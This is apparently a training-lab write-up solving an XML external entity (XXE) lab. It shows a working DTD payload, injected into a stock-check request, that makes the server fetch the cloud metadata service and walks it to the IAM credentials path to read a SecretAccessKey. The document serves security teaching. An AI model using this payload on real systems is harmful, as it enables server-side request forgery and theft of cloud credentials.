![image](https://github.com/udayk01/Web-Security/assets/52235763/38bd5a93-c6c7-4898-829d-4bc3f362ebd9)

## Solution:

> Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/udayk01/Web-Security/assets/52235763/4c28c22f-7940-48c5-9e44-ed54cbfdfb87)

> Insert the following external entity definition in between the XML declaration and the stockCheck element:

```<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>```

> Replace the productId number with a reference to the external entity: ```&xxe;```. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.

![image](https://github.com/udayk01/Web-Security/assets/52235763/50f1a3f4-687e-4e9c-bddf-70865033c700)

> Iteratively update the URL in the DTD to explore the API until you reach ```/latest/meta-data/iam/security-credentials/admin```. This should return JSON containing the SecretAccessKey.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c6ed9cc1-59a9-479a-8734-f136f7c1a0be)

![image](https://github.com/udayk01/Web-Security/assets/52235763/25bc91b0-1dd1-4fa6-a18b-6a89e1c053a4)

![image](https://github.com/udayk01/Web-Security/assets/52235763/527f40e9-c0fa-4544-a35c-dedc13481b88)

![image](https://github.com/udayk01/Web-Security/assets/52235763/19c2e90f-310f-4aed-b76c-8c74ef086c76)

![image](https://github.com/udayk01/Web-Security/assets/52235763/52a2e37c-f415-42ff-9592-4fa2fe5cc1a7)

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/b66d32d9-6974-4e17-b27b-d11c5c103d4f)
